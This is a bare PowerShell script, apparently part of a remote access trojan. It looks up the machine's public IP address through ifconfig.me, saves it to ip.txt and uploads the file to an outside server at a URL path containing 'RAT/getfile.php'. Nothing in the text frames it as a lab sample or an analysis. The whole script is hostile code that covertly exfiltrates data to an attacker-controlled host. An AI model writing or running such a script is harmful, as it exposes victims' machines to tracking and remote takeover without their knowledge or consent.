((Invoke-WebRequest -Uri "http://ifconfig.me/ip").Content.Trim()) > ip.txt

$url = "https://arth.imbeddex.com/RAT/getfile.php"
$filePath = "$PSScriptRoot\ip.txt"

$client = New-Object System.Net.WebClient
$bytes = $client.UploadFile($url, $filePath)